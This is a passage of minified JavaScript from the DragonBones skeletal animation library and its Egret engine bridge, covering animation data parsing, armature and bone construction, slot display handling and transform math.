0==l||null==l?NaN:Number(l)}else r.tweenEasing=NaN;t.parseTimeline(e,r,t.parseMainFrame,n);var o,a,l=e[s.ConstValues.TIMELINE];for(a in l)o=l[a],e=t.parseTransformTimeline(o,r.duration,n),o=o[s.ConstValues.A_NAME],r.addTimeline(e,o);return s.DBDataUtil.addHideTimeline(r,i),s.DBDataUtil.transformAnimationData(r,i),r},t.parseTimeline=function(t,e,i,n){var r,o=0;t=t[s.ConstValues.FRAME];for(var a in t)r=i(t[a],n),r.position=o,e.addFrame(r),o+=r.duration;r&&(r.duration=e.duration-r.position)},t.parseTransformTimeline=function(e,i,n){var r=new a;return r.duration=i,t.parseTimeline(e,r,t.parseTransformFrame,n),r.scale=Number(e[s.ConstValues.A_SCALE]),r.offset=Number(e[s.ConstValues.A_OFFSET]),r},t.parseFrame=function(t,e,i){e.duration=Number(t[s.ConstValues.A_DURATION])/i,e.action=t[s.ConstValues.A_ACTION],e.event=t[s.ConstValues.A_EVENT],e.sound=t[s.ConstValues.A_SOUND]},t.parseMainFrame=function(e,i){var r=new n;return t.parseFrame(e,r,i),r},t.parseTransformFrame=function(i,n){var o=new r;if(t.parseFrame(i,o,n),o.visible=1!=Number(i[s.ConstValues.A_HIDE]),i.hasOwnProperty(s.ConstValues.A_TWEEN_EASING)){var a=i[s.ConstValues.A_TWEEN_EASING];o.tweenEasing=void 0==a||null==a?NaN:Number(a)}else o.tweenEasing=0;return o.tweenRotate=Number(i[s.ConstValues.A_TWEEN_ROTATE])||0,o.displayIndex=Number(i[s.ConstValues.A_DISPLAY_INDEX])||0,o.zOrder=Number(i[s.ConstValues.A_Z_ORDER])||0,t.parseTransform(i[s.ConstValues.TRANSFORM],o.global,o.pivot),o.transform.copy(o.global),(a=i[s.ConstValues.COLOR_TRANSFORM])&&(o.color=new e.ColorTransform,o.color.alphaOffset=Number(a[s.ConstValues.A_ALPHA_OFFSET]),o.color.redOffset=Number(a[s.ConstValues.A_RED_OFFSET]),o.color.greenOffset=Number(a[s.ConstValues.A_GREEN_OFFSET]),o.color.blueOffset=Number(a[s.ConstValues.A_BLUE_OFFSET]),o.color.alphaMultiplier=.01*Number(a[s.ConstValues.A_ALPHA_MULTIPLIER]),o.color.redMultiplier=.01*Number(a[s.ConstValues.A_RED_MULTIPLIER]),o.color.greenMultiplier=.01*Number(a[s.ConstValues.A_GREEN_MULTIPLIER]),o.color.blueMultiplier=.01*Number(a[s.ConstValues.A_BLUE_MULTIPLIER])),o},t.parseTransform=function(t,e,i){void 0===i&&(i=null),t&&(e&&(e.x=Number(t[s.ConstValues.A_X]),e.y=Number(t[s.ConstValues.A_Y]),e.skewX=Number(t[s.ConstValues.A_SKEW_X])*s.ConstValues.ANGLE_TO_RADIAN,e.skewY=Number(t[s.ConstValues.A_SKEW_Y])*s.ConstValues.ANGLE_TO_RADIAN,e.scaleX=Number(t[s.ConstValues.A_SCALE_X]),e.scaleY=Number(t[s.ConstValues.A_SCALE_Y])),i&&(i.x=Number(t[s.ConstValues.A_PIVOT_X]),i.y=Number(t[s.ConstValues.A_PIVOT_Y])))},t}(),t.DataParser=o,o.prototype.__class__="dragonBones.objects.DataParser"}(t.objects||(t.objects={}));var r=t.objects;!function(t){var e=function(t){function e(){t.call(this),this._dataDic={},this._textureAtlasDic={},this._textureAtlasLoadingDic={}}return __extends(e,t),e.prototype.getSkeletonData=function(t){return this._dataDic[t]},e.prototype.addSkeletonData=function(t,e){if(void 0===e&&(e=null),!t)throw Error();if(!(e=e||t.name))throw Error("Unnamed data!");this._dataDic[e]=t},e.prototype.removeSkeletonData=function(t){delete this._dataDic[t]},e.prototype.getTextureAtlas=function(t){return this._textureAtlasDic[t]},e.prototype.addTextureAtlas=function(t,e){if(void 0===e&&(e=null),!t)throw Error();if(!(e=e||t.name))throw Error("Unnamed data!");this._textureAtlasDic[e]=t},e.prototype.removeTextureAtlas=function(t){delete this._textureAtlasDic[t]},e.prototype.dispose=function(t){if(void 0===t&&(t=!0),t){for(var e in this._dataDic)this._dataDic[e].dispose();for(e in this._textureAtlasDic)this._textureAtlasDic[e].dispose()}this._currentTextureAtlasName=this._currentDataName=this._textureAtlasLoadingDic=this._textureAtlasDic=this._dataDic=null},e.prototype.buildArmature=function(t,e,i,n,s){if(i){var o=this._dataDic[i];if(o)var a=o.getArmatureData(t)}else for(i in this._dataDic)if(o=this._dataDic[i],a=o.getArmatureData(t))break;if(!a)return null;this._currentDataName=i,this._currentTextureAtlasName=n||i,(n=this._generateArmature()).name=t;var l,p,u,d=a.getBoneDataList();for(u in d)p=d[u],l=new h,l.name=p.name,l.fixedRotation=p.fixedRotation,l.scaleMode=p.scaleMode,l.origin.copy(p.transform),a.getBoneData(p.parent)?n.addChild(l,p.parent):n.addChild(l,null);if(e&&e!=t){var c=o.getArmatureData(e);if(!c)for(i in this._dataDic)if(o=this._dataDic[i],c=o.getArmatureData(e))break}if(c?n.animation.setAnimationDataList(c.getAnimationDataList()):n.animation.setAnimationDataList(a.getAnimationDataList()),!(l=a.getSkinData(s)))throw Error();t=[],i=l.getSlotDataList();for(u in i)if(o=i[u],l=n.getBone(o.parent)){for(s=o.getDisplayDataList(),(e=this._generateSlot()).name=o.name,e._blendMode=o.blendMode,e._originZOrder=o.zOrder,e._dislayDataList=s,t.length=0,o=s.length;o--;)switch((a=s[o]).type){case r.DisplayData.ARMATURE:(a=this.buildArmature(a.name,null,this._currentDataName,this._currentTextureAtlasName,null))&&(t[o]=a);break;default:t[o]=this._generateDisplay(this._textureAtlasDic[this._currentTextureAtlasName],a.name,a.pivot.x,a.pivot.y)}e.setDisplayList(t),e._changeDisplay(0),l.addChild(e)}return n._slotsZOrderChanged=!0,n.advanceTime(0),n},e.prototype.getTextureDisplay=function(t,e,i,n){if(e)var r=this._textureAtlasDic[e];if(!r&&!e)for(e in this._textureAtlasDic){if((r=this._textureAtlasDic[e]).getRegion(t))break;r=null}return r?((isNaN(i)||isNaN(n))&&(e=this._dataDic[e])&&(e=e.getSubTexturePivot(t))&&(i=e.x,n=e.y),this._generateDisplay(r,t,i,n)):null},e.prototype._generateArmature=function(){return null},e.prototype._generateSlot=function(){return null},e.prototype._generateDisplay=function(t,e,i,n){return null},e}(i.EventDispatcher);t.BaseFactory=e,e.prototype.__class__="dragonBones.factorys.BaseFactory"}(t.factorys||(t.factorys={})),function(t){var i=function(){function t(){}return t.ANGLE_TO_RADIAN=Math.PI/180,t.DRAGON_BONES="dragonBones",t.ARMATURE="armature",t.SKIN="skin",t.BONE="bone",t.SLOT="slot",t.DISPLAY="display",t.ANIMATION="animation",t.TIMELINE="timeline",t.FRAME="frame",t.TRANSFORM="transform",t.COLOR_TRANSFORM="colorTransform",t.TEXTURE_ATLAS="TextureAtlas",t.SUB_TEXTURE="SubTexture",t.A_VERSION="version",t.A_IMAGE_PATH="imagePath",t.A_FRAME_RATE="frameRate",t.A_NAME="name",t.A_PARENT="parent",t.A_LENGTH="length",t.A_TYPE="type",t.A_FADE_IN_TIME="fadeInTime",t.A_DURATION="duration",t.A_SCALE="scale",t.A_OFFSET="offset",t.A_LOOP="loop",t.A_EVENT="event",t.A_SOUND="sound",t.A_ACTION="action",t.A_HIDE="hide",t.A_TWEEN_EASING="tweenEasing",t.A_TWEEN_ROTATE="tweenRotate",t.A_DISPLAY_INDEX="displayIndex",t.A_Z_ORDER="z",t.A_BLENDMODE="blendMode",t.A_WIDTH="width",t.A_HEIGHT="height",t.A_SCALE_MODE="scaleMode",t.A_FIXED_ROTATION="fixedRotation",t.A_X="x",t.A_Y="y",t.A_SKEW_X="skX",t.A_SKEW_Y="skY",t.A_SCALE_X="scX",t.A_SCALE_Y="scY",t.A_PIVOT_X="pX",t.A_PIVOT_Y="pY",t.A_ALPHA_OFFSET="aO",t.A_RED_OFFSET="rO",t.A_GREEN_OFFSET="gO",t.A_BLUE_OFFSET="bO",t.A_ALPHA_MULTIPLIER="aM",t.A_RED_MULTIPLIER="rM",t.A_GREEN_MULTIPLIER="gM",t.A_BLUE_MULTIPLIER="bM",t}();t.ConstValues=i,i.prototype.__class__="dragonBones.utils.ConstValues";var s=function(){function t(){}return t.transformPointWithParent=function(e,i){var n=t._helpMatrix;t.transformToMatrix(i,n),n.invert();var r=e.x,s=e.y;e.x=n.a*r+n.c*s+n.tx,e.y=n.d*s+n.b*r+n.ty,e.skewX=t.formatRadian(e.skewX-i.skewX),e.skewY=t.formatRadian(e.skewY-i.skewY)},t.transformToMatrix=function(t,e){e.a=t.scaleX*Math.cos(t.skewY),e.b=t.scaleX*Math.sin(t.skewY),e.c=-t.scaleY*Math.sin(t.skewX),e.d=t.scaleY*Math.cos(t.skewX),e.tx=t.x,e.ty=t.y},t.formatRadian=function(e){return(e%=t.DOUBLE_PI)>Math.PI&&(e-=t.DOUBLE_PI),e<-Math.PI&&(e+=t.DOUBLE_PI),e},t.DOUBLE_PI=2*Math.PI,t._helpMatrix=new e.Matrix,t}();t.TransformUtil=s,s.prototype.__class__="dragonBones.utils.TransformUtil",i=function(){function t(){}return t.transformArmatureData=function(t){for(var e,i,n=t.getBoneDataList(),r=n.length;r--;)(e=n[r]).parent&&(i=t.getBoneData(e.parent))&&(e.transform.copy(e.global),s.transformPointWithParent(e.transform,i.global))},t.transformArmatureDataAnimations=function(e){for(var i=e.getAnimationDataList(),n=i.length;n--;)t.transformAnimationData(i[n],e)},t.transformAnimationData=function(e,i){for(var n,r,o,a,h,l,p,u,d,c,_=i.getSkinData(null),g=i.getBoneDataList(),_=_.getSlotDataList(),f=g.length;f--;)if(n=g[f],r=e.getTimeline(n.name)){o=null;for(var m in _)if((o=_[m]).parent==n.name)break;a=n.parent?e.getTimeline(n.parent):null,u=p=l=null,c=(h=r.getFrameList()).length;for(var y=0;y<c;y++){if(d=h[y],a?(t._helpTransform1.copy(d.global),t.getTimelineTransform(a,d.position,t._helpTransform2),s.transformPointWithParent(t._helpTransform1,t._helpTransform2),d.transform.copy(t._helpTransform1)):d.transform.copy(d.global),d.transform.x-=n.transform.x,d.transform.y-=n.transform.y,d.transform.skewX-=n.transform.skewX,d.transform.skewY-=n.transform.skewY,d.transform.scaleX-=n.transform.scaleX,d.transform.scaleY-=n.transform.scaleY,!r.transformed&&o&&(d.zOrder-=o.zOrder),l||((l=r.originTransform).copy(d.transform),l.skewX=s.formatRadian(l.skewX),l.skewY=s.formatRadian(l.skewY),p=r.originPivot,p.x=d.pivot.x,p.y=d.pivot.y),d.transform.x-=l.x,d.transform.y-=l.y,d.transform.skewX=s.formatRadian(d.transform.skewX-l.skewX),d.transform.skewY=s.formatRadian(d.transform.skewY-l.skewY),d.transform.scaleX-=l.scaleX,d.transform.scaleY-=l.scaleY,r.transformed||(d.pivot.x-=p.x,d.pivot.y-=p.y),u){var v=d.transform.skewX-u.transform.skewX;u.tweenRotate?0<u.tweenRotate?(0>v&&(d.transform.skewX+=2*Math.PI,d.transform.skewY+=2*Math.PI),1<u.tweenRotate&&(d.transform.skewX+=2*Math.PI*(u.tweenRotate-1),d.transform.skewY+=2*Math.PI*(u.tweenRotate-1))):(0<v&&(d.transform.skewX-=2*Math.PI,d.transform.skewY-=2*Math.PI),1>u.tweenRotate&&(d.transform.skewX+=2*Math.PI*(u.tweenRotate+1),d.transform.skewY+=2*Math.PI*(u.tweenRotate+1))):(d.transform.skewX=u.transform.skewX+s.formatRadian(d.transform.skewX-u.transform.skewX),d.transform.skewY=u.transform.skewY+s.formatRadian(d.transform.skewY-u.transform.skewY))}u=d}r.transformed=!0}},t.getTimelineTransform=function(t,e,i){for(var r,o=t.getFrameList(),a=o.length;a--;)if((t=o[a]).position<=e&&t.position+t.duration>e){r=t.tweenEasing,a==o.length-1||isNaN(r)||e==t.position?i.copy(t.global):(e=(e-t.position)/t.duration,r&&(e=n.TimelineState.getEaseValue(e,r)),o=o[a+1],i.x=t.global.x+(o.global.x-t.global.x)*e,i.y=t.global.y+(o.global.y-t.global.y)*e,i.skewX=s.formatRadian(t.global.skewX+(o.global.skewX-t.global.skewX)*e),i.skewY=s.formatRadian(t.global.skewY+(o.global.skewY-t.global.skewY)*e),i.scaleX=t.global.scaleX+(o.global.scaleX-t.global.scaleX)*e,i.scaleY=t.global.scaleY+(o.global.scaleY-t.global.scaleY)*e);break}},t.addHideTimeline=function(t,e){for(var i,n=e.getBoneDataList(),s=n.length;s--;)i=n[s],i=i.name,t.getTimeline(i)||t.addTimeline(r.TransformTimeline.HIDE_TIMELINE,i)},t._helpTransform1=new r.DBTransform,t._helpTransform2=new r.DBTransform,t}(),t.DBDataUtil=i,i.prototype.__class__="dragonBones.utils.DBDataUtil"}(t.utils||(t.utils={}));var s=t.utils,o=function(){function t(){this.global=new r.DBTransform,this.origin=new r.DBTransform,this.offset=new r.DBTransform,this.tween=new r.DBTransform,this.tween.scaleX=this.tween.scaleY=0,this._globalTransformMatrix=new e.Matrix,this._visible=!0,this._isDisplayOnStage=this._isColorChanged=!1,this._scaleType=0,this.fixedRotation=!1}return t.prototype.getVisible=function(){return this._visible},t.prototype.setVisible=function(t){this._visible=t},t.prototype._setParent=function(t){this.parent=t},t.prototype._setArmature=function(t){this.armature&&this.armature._removeDBObject(this),(this.armature=t)&&this.armature._addDBObject(this)},t.prototype.dispose=function(){this._globalTransformMatrix=this.tween=this.offset=this.origin=this.global=this.armature=this.parent=null},t.prototype._update=function(){if(this.global.scaleX=(this.origin.scaleX+this.tween.scaleX)*this.offset.scaleX,this.global.scaleY=(this.origin.scaleY+this.tween.scaleY)*this.offset.scaleY,this.parent){var t=this.origin.x+this.offset.x+this.tween.x,e=this.origin.y+this.offset.y+this.tween.y,i=this.parent._globalTransformMatrix;this._globalTransformMatrix.tx=this.global.x=i.a*t+i.c*e+i.tx,this._globalTransformMatrix.ty=this.global.y=i.d*e+i.b*t+i.ty,this.fixedRotation?(this.global.skewX=this.origin.skewX+this.offset.skewX+this.tween.skewX,this.global.skewY=this.origin.skewY+this.offset.skewY+this.tween.skewY):(this.global.skewX=this.origin.skewX+this.offset.skewX+this.tween.skewX+this.parent.global.skewX,this.global.skewY=this.origin.skewY+this.offset.skewY+this.tween.skewY+this.parent.global.skewY),this.parent.scaleMode>=this._scaleType&&(this.global.scaleX*=this.parent.global.scaleX,this.global.scaleY*=this.parent.global.scaleY)}else this._globalTransformMatrix.tx=this.global.x=this.origin.x+this.offset.x+this.tween.x,this._globalTransformMatrix.ty=this.global.y=this.origin.y+this.offset.y+this.tween.y,this.global.skewX=this.origin.skewX+this.offset.skewX+this.tween.skewX,this.global.skewY=this.origin.skewY+this.offset.skewY+this.tween.skewY;this._globalTransformMatrix.a=this.global.scaleX*Math.cos(this.global.skewY),this._globalTransformMatrix.b=this.global.scaleX*Math.sin(this.global.skewY),this._globalTransformMatrix.c=-this.global.scaleY*Math.sin(this.global.skewX),this._globalTransformMatrix.d=this.global.scaleY*Math.cos(this.global.skewX)},t}();t.DBObject=o,o.prototype.__class__="dragonBones.DBObject";var a=function(t){function e(e){t.call(this),this._displayBridge=e,this._displayList=[],this._displayIndex=-1,this._scaleType=1,this._offsetZOrder=this._tweenZorder=this._originZOrder=0,this._isHideDisplay=this._isDisplayOnStage=!1,this._blendMode="normal",this._displayBridge.updateBlendMode(this._blendMode)}return __extends(e,t),e.prototype.getZOrder=function(){return this._originZOrder+this._tweenZorder+this._offsetZOrder},e.prototype.setZOrder=function(t){this.getZOrder()!=t&&(this._offsetZOrder=t-this._originZOrder-this._tweenZorder,this.armature&&(this.armature._slotsZOrderChanged=!0))},e.prototype.getDisplay=function(){var t=this._displayList[this._displayIndex];return t instanceof l?t.getDisplay():t},e.prototype.setDisplay=function(t){this._displayList[this._displayIndex]=t,this._setDisplay(t)},e.prototype.getBlendMode=function(){return this._blendMode},e.prototype.setBlendMode=function(t){this._blendMode!=t&&(this._blendMode=t,this._displayBridge.getDisplay()&&this._displayBridge.updateBlendMode(this._blendMode))},e.prototype.getChildArmature=function(){var t=this._displayList[this._displayIndex];return t instanceof l?t:null},e.prototype.setChildArmature=function(t){(this._displayList[this._displayIndex]=t)&&this._setDisplay(t.getDisplay())},e.prototype.getDisplayList=function(){return this._displayList},e.prototype.setDisplayList=function(t){if(!t)throw Error();for(var e=this._displayList.length=t.length;e--;)this._displayList[e]=t[e];0<=this._displayIndex&&(t=this._displayIndex,this._displayIndex=-1,this._changeDisplay(t))},e.prototype._setDisplay=function(t){this._displayBridge.getDisplay()?this._displayBridge.setDisplay(t):(this._displayBridge.setDisplay(t),this.armature&&(this._displayBridge.addDisplay(this.armature.getDisplay(),-1),this.armature._slotsZOrderChanged=!0)),this.updateChildArmatureAnimation(),t&&this._displayBridge.updateBlendMode(this._blendMode),!this._isHideDisplay&&this._displayBridge.getDisplay()?this._isDisplayOnStage=!0:this._isDisplayOnStage=!1},e.prototype._changeDisplay=function(t){if(0>t)this._isHideDisplay||(this._isHideDisplay=!0,this._displayBridge.removeDisplay(),this.updateChildArmatureAnimation());else{if(this._isHideDisplay){this._isHideDisplay=!1;var e=!0;this.armature&&(this._displayBridge.addDisplay(this.armature.getDisplay(),-1),this.armature._slotsZOrderChanged=!0)}var i=this._displayList.length;t>=i&&0<i&&(t=i-1),this._displayIndex!=t?(this._displayIndex=t,(t=this._displayList[this._displayIndex])instanceof l?this._setDisplay(t.getDisplay()):this._setDisplay(t),this._dislayDataList&&this._displayIndex<=this._dislayDataList.length&&this.origin.copy(this._dislayDataList[this._displayIndex].transform)):e&&this.updateChildArmatureAnimation()}!this._isHideDisplay&&this._displayBridge.getDisplay()?this._isDisplayOnStage=!0:this._isDisplayOnStage=!1},e.prototype.setVisible=function(t){t!=this._visible&&(this._visible=t,this._updateVisible(this._visible))},e.prototype._setArmature=function(e){t.prototype._setArmature.call(this,e),this.armature?(this.armature._slotsZOrderChanged=!0,this._displayBridge.addDisplay(this.armature.getDisplay(),-1)):this._displayBridge.removeDisplay()},e.prototype.dispose=function(){this._displayBridge&&(t.prototype.dispose.call(this),this._displayBridge.dispose(),this._displayList.length=0,this._dislayDataList=this._displayList=this._displayBridge=null)},e.prototype._update=function(){if(t.prototype._update.call(this),this._isDisplayOnStage){var e=this.parent._tweenPivot.x,i=this.parent._tweenPivot.y;if(e||i){var n=this.parent._globalTransformMatrix;this._globalTransformMatrix.tx+=n.a*e+n.c*i,this._globalTransformMatrix.ty+=n.b*e+n.d*i}this._displayBridge.updateTransform(this._globalTransformMatrix,this.global)}},e.prototype._updateVisible=function(t){this._displayBridge.setVisible(this.parent.getVisible()&&this._visible&&t)},e.prototype.updateChildArmatureAnimation=function(){var t=this.getChildArmature();if(t)if(this._isHideDisplay)t.animation.stop(),t.animation._lastAnimationState=null;else{var e=this.armature?this.armature.animation.getLastAnimationName():null;e&&t.animation.hasAnimation(e)?t.animation.gotoAndPlay(e):t.animation.play()}},e}(o);t.Slot=a,a.prototype.__class__="dragonBones.Slot";var h=function(t){function n(){t.call(this),this._children=[],this._scaleType=2,this._tweenPivot=new e.Point,this.scaleMode=1}return __extends(n,t),n.prototype.setVisible=function(t){if(this._visible!=t)for(this._visible=t,t=this._children.length;t--;){var e=this._children[t];e instanceof a&&e._updateVisible(this._visible)}},n.prototype._setArmature=function(e){for(t.prototype._setArmature.call(this,e),e=this._children.length;e--;)this._children[e]._setArmature(this.armature)},n.prototype.dispose=function(){if(this._children){t.prototype.dispose.call(this);for(var e=this._children.length;e--;)this._children[e].dispose();this._children.length=0,this.slot=this._tweenPivot=this._children=null}},n.prototype.contains=function(t){if(!t)throw Error();if(t==this)return!1;for(;t!=this&&null!=t;)t=t.parent;return t==this},n.prototype.addChild=function(t){if(!t)throw Error();if(t==this||t instanceof n&&t.contains(this))throw Error("An Bone cannot be added as a child to itself or one of its children (or children's children, etc.)");t.parent&&t.parent.removeChild(t),this._children[this._children.length]=t,t._setParent(this),t._setArmature(this.armature),!this.slot&&t instanceof a&&(this.slot=t)},n.prototype.removeChild=function(t){if(!t)throw Error();var e=this._children.indexOf(t);if(!(0<=e))throw Error();this._children.splice(e,1),t._setParent(null),t._setArmature(null),t==this.slot&&(this.slot=null)},n.prototype.getSlots=function(){for(var t=[],e=this._children.length;e--;)this._children[e]instanceof a&&t.unshift(this._children[e]);return t},n.prototype._arriveAtFrame=function(t,e,r,s){if(t){if(e=r.getMixingTransform(this.name),!r.displayControl||2!=e&&-1!=e||this.displayController&&this.displayController!=r.name||!this.slot||(0<=(e=t.displayIndex)&&!isNaN(t.zOrder)&&t.zOrder!=this.slot._tweenZorder&&(this.slot._tweenZorder=t.zOrder,this.armature._slotsZOrderChanged=!0),this.slot._changeDisplay(e),this.slot._updateVisible(t.visible)),t.event&&this.armature.hasEventListener(i.FrameEvent.BONE_FRAME_EVENT)&&(e=new i.FrameEvent(i.FrameEvent.BONE_FRAME_EVENT),e.bone=this,e.animationState=r,e.frameLabel=t.event,this.armature._eventList.push(e)),t.sound&&n._soundManager.hasEventListener(i.SoundEvent.SOUND)&&(e=new i.SoundEvent(i.SoundEvent.SOUND),e.armature=this.armature,e.animationState=r,e.sound=t.sound,n._soundManager.dispatchEvent(e)),t.action)for(var o in this._children)this._children[o]instanceof a&&(r=this._children[o].getChildArmature())&&r.animation.gotoAndPlay(t.action)}else this.slot&&this.slot._changeDisplay(-1)},n.prototype._updateColor=function(t,e,i,n,r,s,o,a,h){(h||this._isColorChanged)&&this.slot._displayBridge.updateColor(t,e,i,n,r,s,o,a),this._isColorChanged=h},n._soundManager=i.SoundEventManager.getInstance(),n}(o);t.Bone=h,h.prototype.__class__="dragonBones.Bone";var l=function(t){function e(e){t.call(this),this.animation=new n.Animation(this),this._display=e,this._slotsZOrderChanged=!1,this._slotList=[],this._boneList=[],this._eventList=[]}return __extends(e,t),e.prototype.getDisplay=function(){return this._display},e.prototype.dispose=function(){if(this.animation){this.animation.dispose();for(var t=this._slotList.length;t--;)this._slotList[t].dispose();for(t=this._boneList.length;t--;)this._boneList[t].dispose();this._slotList.length=0,this._boneList.length=0,this._eventList.length=0,this.animation=this._display=this._eventList=this._boneList=this._slotList=null}},e.prototype.advanceTime=function(t){this.animation.advanceTime(t),t*=this.animation.timeScale;for(n=this._boneList.length;n--;)this._boneList[n]._update();for(var e,n=this._slotList.length;n--;)(e=this._slotList[n])._update(),e._isDisplayOnStage&&(e=e.getChildArmature())&&e.advanceTime(t);if(this._slotsZOrderChanged&&(this.updateSlotsZOrder(),this.hasEventListener(i.ArmatureEvent.Z_ORDER_UPDATED)&&this.dispatchEvent(new i.ArmatureEvent(i.ArmatureEvent.Z_ORDER_UPDATED))),this._eventList.length){for(t=this._eventList.length,n=0;n<t;n++)this.dispatchEvent(this._eventList[n]);this._eventList.length=0}},e.prototype.getSlots=function(t){return void 0===t&&(t=!0),t?this._slotList.concat():this._slotList},e.prototype.getBones=function(t){return void 0===t&&(t=!0),t?this._boneList.concat():this._boneList},e.prototype.getSlot=function(t){for(var e=this._slotList.length;e--;)if(this._slotList[e].name==t)return this._slotList[e];return null},e.prototype.getSlotByDisplay=function(t){if(t)for(var e=this._slotList.length;e--;)if(this._slotList[e].getDisplay()==t)return this._slotList[e];return null},e.prototype.removeSlot=function(t){if(!t)throw Error();if(!(0<=this._slotList.indexOf(t)))throw Error();t.parent.removeChild(t)},e.prototype.removeSlotByName=function(t){t&&(t=this.getSlot(t))&&this.removeSlot(t)},e.prototype.getBone=function(t){for(var e=this._boneList.length;e--;)if(this._boneList[e].name==t)return this._boneList[e];return null},e.prototype.getBoneByDisplay=function(t){return(t=this.getSlotByDisplay(t))?t.parent:null},e.prototype.removeBone=function(t){if(!t)throw Error();if(!(0<=this._boneList.indexOf(t)))throw Error();t.parent?t.parent.removeChild(t):t._setArmature(null)},e.prototype.removeBoneByName=function(t){t&&(t=this.getBone(t))&&this.removeBone(t)},e.prototype.addChild=function(t,e){if(!t)throw Error();if(e){var i=this.getBone(e);if(!i)throw Error();i.addChild(t)}else t.parent&&t.parent.removeChild(t),t._setArmature(this)},e.prototype.updateSlotsZOrder=function(){this._slotList.sort(this.sortSlot);for(var t,e=this._slotList.length;e--;)(t=this._slotList[e])._isDisplayOnStage&&t._displayBridge.addDisplay(this._display,-1);this._slotsZOrderChanged=!1},e.prototype._addDBObject=function(t){t instanceof a?0>this._slotList.indexOf(t)&&(this._slotList[this._slotList.length]=t):t instanceof h&&0>this._boneList.indexOf(t)&&(this._boneList[this._boneList.length]=t,this._sortBoneList())},e.prototype._removeDBObject=function(t){t instanceof a?0<=(t=this._slotList.indexOf(t))&&this._slotList.splice(t,1):t instanceof h&&0<=(t=this._boneList.indexOf(t))&&this._boneList.splice(t,1)},e.prototype._sortBoneList=function(){var t=this._boneList.length;if(0!=t){for(var e,i,n,r=[];t--;){for(e=0,n=i=this._boneList[t];n;)e++,n=n.parent;r[t]={level:e,bone:i}}for(r.sort(this.sortBone),t=r.length;t--;)this._boneList[t]=r[t].bone}},e.prototype._arriveAtFrame=function(t,n,r,s){t.event&&this.hasEventListener(i.FrameEvent.ANIMATION_FRAME_EVENT)&&(n=new i.FrameEvent(i.FrameEvent.ANIMATION_FRAME_EVENT),n.animationState=r,n.frameLabel=t.event,this._eventList.push(n)),t.sound&&e._soundManager.hasEventListener(i.SoundEvent.SOUND)&&(n=new i.SoundEvent(i.SoundEvent.SOUND),n.armature=this,n.animationState=r,n.sound=t.sound,e._soundManager.dispatchEvent(n)),t.action&&r.isPlaying&&this.animation.gotoAndPlay(t.action)},e.prototype.sortSlot=function(t,e){return t.getZOrder()<e.getZOrder()?1:-1},e.prototype.sortBone=function(t,e){return t.level<e.level?1:-1},e._soundManager=i.SoundEventManager.getInstance(),e}(i.EventDispatcher);t.Armature=l,l.prototype.__class__="dragonBones.Armature"}(dragonBones||(dragonBones={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){!function(t){var e=function(){function t(){}return t.prototype.getVisible=function(){return!!this._display&&this._display.visible},t.prototype.setVisible=function(t){this._display&&(this._display.visible=t)},t.prototype.getDisplay=function(){return this._display},t.prototype.setDisplay=function(t){if(this._display!=t){if(this._display){var e=this._display.parent;if(e)var i=e.getChildIndex(this._display);this.removeDisplay()}this._display=t,this.addDisplay(e,i)}},t.prototype.dispose=function(){this._display=null},t.prototype.updateTransform=function(e,i){this._display._x=e.tx,this._display._y=e.ty,this._display._skewX=i.skewX*t.RADIAN_TO_ANGLE,this._display._skewY=i.skewY*t.RADIAN_TO_ANGLE,this._display._scaleX=i.scaleX,this._display._scaleY=i.scaleY,this._display._setSizeDirty()},t.prototype.updateColor=function(t,e,i,n,r,s,o,a){this._display&&(this._display._alpha=r)},t.prototype.updateBlendMode=function(t){this._display&&t&&(this._display.blendMode=t)},t.prototype.addDisplay=function(t,e){t&&this._display&&(this._display._parent&&this._display._parent.removeChild(this._display),0>e?t.addChild(this._display):t.addChildAt(this._display,Math.min(e,t.numChildren)))},t.prototype.removeDisplay=function(){this._display&&this._display._parent&&this._display._parent.removeChild(this._display)},t.RADIAN_TO_ANGLE=180/Math.PI,t}();t.DragonBonesEgretBridge=e,e.prototype.__class__="dragonBones.display.DragonBonesEgretBridge"}(t.display||(t.display={}));var e=t.display;!function(e){var i=function(){function e(e,i,n){void 0===n&&(n=1),this.texture=e,this.textureAtlasRawData=i,this._textureData={},this.scale=n,this.name=i[t.utils.ConstValues.A_NAME],this.parseData(i),this.spriteSheet=new egret.SpriteSheet(e)}return e.prototype.getTexture=function(t){var e=this.spriteSheet.getTexture(t);return e||(e=this._textureData[t],e=this.spriteSheet.createTexture(t,e.x,e.y,e.width,e.height)),e},e.prototype.dispose=function(){this.texture=null},e.prototype.getRegion=function(t){throw Error("error")},e.prototype.parseData=function(t){for(var e=t.SubTexture.length,i=0;i<e;i++){var n=t.SubTexture[i];this._textureData[n.name]=n}},e}();e.EgretTextureAtlas=i,i.prototype.__class__="dragonBones.textures.EgretTextureAtlas"}(t.textures||(t.textures={})),function(i){var n=function(i){function n(){i.call(this)}return __extends(n,i),n.prototype._generateArmature=function(){return new t.Armature(new egret.DisplayObjectContainer)},n.prototype._generateSlot=function(){return new t.Slot(new e.DragonBonesEgretBridge)},n.prototype._generateDisplay=function(t,e,i,n){var r=new egret.Bitmap;return r.texture=t.getTexture(e),r.anchorOffsetX=i,r.anchorOffsetY=n,r},n}(i.BaseFactory);i.EgretFactory=n,n.prototype.__class__="dragonBones.factorys.EgretFactory"}(t.factorys||(t.factorys={}))}(dragonBones||(dragonBones={})),__extends=this.__extends||function(t,e){function i(){this.constructor=t}for(var n in e)e.hasOwnProperty(n)&&(t[n]=e[n]);i.prototype=e.prototype,t.prototype=new i},function(t){var e=function(e){function i(t){void 0===t&&(t=60),e.call(this),this.frameRate=t,this._time=0,60==t&&(i.requestAnimationFrame=window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||window.oRequestAnimationFrame||window.msRequestAnimationFrame,i.cancelAnimationFrame=window.cancelAnimationFrame||window.msCancelAnimationFrame||window.mozCancelAnimationFrame||window.webkitCancelAnimationFrame||window.oCancelAnimationFrame||window.cancelRequestAnimationFrame||window.msCancelRequestAnimationFrame||window.mozCancelRequestAnimationFrame||window.oCancelRequestAnimationFrame||window.webkitCancelRequestAnimationFrame),i.requestAnimationFrame||(i.requestAnimationFrame=function(e){return window.setTimeout(e,1e3/t)}),i.cancelAnimationFrame||(i.cancelAnimationFrame=function(t){return window.clearTimeout(t)}),i.instance=this,this.registerListener()}return __extends(i,e),i.prototype.enterFrame=function(){var 